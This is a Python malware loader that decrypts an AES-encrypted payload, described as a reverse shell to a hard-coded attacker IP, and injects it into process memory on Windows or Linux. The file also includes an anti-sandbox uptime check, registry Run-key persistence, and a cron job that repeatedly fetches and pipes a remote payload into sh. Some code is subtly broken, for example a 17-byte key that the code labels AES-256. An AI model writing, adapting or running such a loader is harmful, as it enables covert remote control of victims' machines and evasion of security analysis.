import sys
import os
import ctypes
import hashlib
import socket
import subprocess
from Crypto.Cipher import AES

# Configuration
ATTACKER_IP = "192.168.1.77"
PORT = 443
KEY = b'SecretKey12345678'  # 16/24/32 bytes for AES

# Encrypted reverse shell (AES-256-CTR)
ENC_PAYLOAD = bytes.fromhex("f7ffb9c67596d7e92bb219c11f63bf11d4e37545c180c21bdf4f195a421e1a9fc20bc0a9b6357d38a3cd4f6e16c33cc3731ee104d6795e4cffdc8d02d67b3888daed51da942ed052db46b8162d09fe94bb1af4b6401c1f8ab14263018bb092db677a631d069309177939f53ed15f69164c627d939a5dfd69f8942e376765c99711dfe5b3b8a53c6c3acb5cb319f5164067fee195a177
90bd2bdbc36f71a743de7bd72a34ca8fb56f3bd26e2e4dc75b6441159988
41232d385930ae7ccc0126fc126476ddd6fe310e2ae574edb6da3984cf63
efaed8ec5348be4612e23f991afcc7975ebda89c3785ab7946022fdb81b0
58f4ea2e1c9ac361b9c5f7a3c1eae22cf71822dffca99f08b0c27e79cd6e
4b6aca3dd714471ed1f04b082f99f01b4c90f825605e1ae45d77a71e63c9
a4f9aa2efb111ca4e0c3c6781279d31fe577f57d7272d9c95f8e630d9e1a
fd157f88e428ba5b8727802cf7a007f22e06ca24ff8e21ee842d0c1ace1c
724a7f613dbf8ea7725529d8bf0b53460de15a6c590323fdbf4c72fe116c
8b78e45a97b80dc03d1e5a1fc9b79b8ba5a404490293a1317e23283eeda4
15b243b2caf87c84dfd9c4aca8cf7f3157f23b8dc53da2b3b7944b9eca0e
4c9f0c9aa8efcc70065688bf60caa8e41698e433c6e8fb19bea916addb4c
20bb73c7898208ad565aabaf26e848821675c3f67918a044a52b62847837
27")  # Replace with your encrypted shellcode

class Security:
    @staticmethod
    def decrypt_payload():
        cipher = AES.new(KEY, AES.MODE_CTR, nonce=b'01234567')
        return cipher.decrypt(ENC_PAYLOAD)

    @staticmethod
    def mem_inject(payload):
        if sys.platform == "win32":
            ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
            ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(payload), 0x3000, 0x40)
            ctypes.windll.kernel32.RtlMoveMemory(ptr, payload, len(payload))
            ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
        else:
            from ctypes import CDLL
            libc = CDLL(None)
            addr = libc.valloc(len(payload))
            libc.memcpy(addr, payload, len(payload))
            libc.mprotect(addr, len(payload), 0x7)  # RWX
            libc.fork.restype = ctypes.c_int
            if libc.fork() == 0:
                libc.execve(addr, None, None)

def main():
    # Decrypt and execute
    decrypted = Security.decrypt_payload()
    
    # Anti-sandbox check
    if sys.platform == "win32" and ctypes.windll.kernel32.GetTickCount() < 300000:
        return  # Exit if running for <5 minutes
    
    # Persistence mechanism
    if sys.platform == "win32":
        os.system(f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d '{sys.argv[0]}' /f")
    else:
        os.system("echo '* * * * * curl http://192.168.1.77:8000/payload | sh' | crontab -")
    
    # Memory injection
    Security.mem_inject(decrypted)

if __name__ == "__main__":
    main()
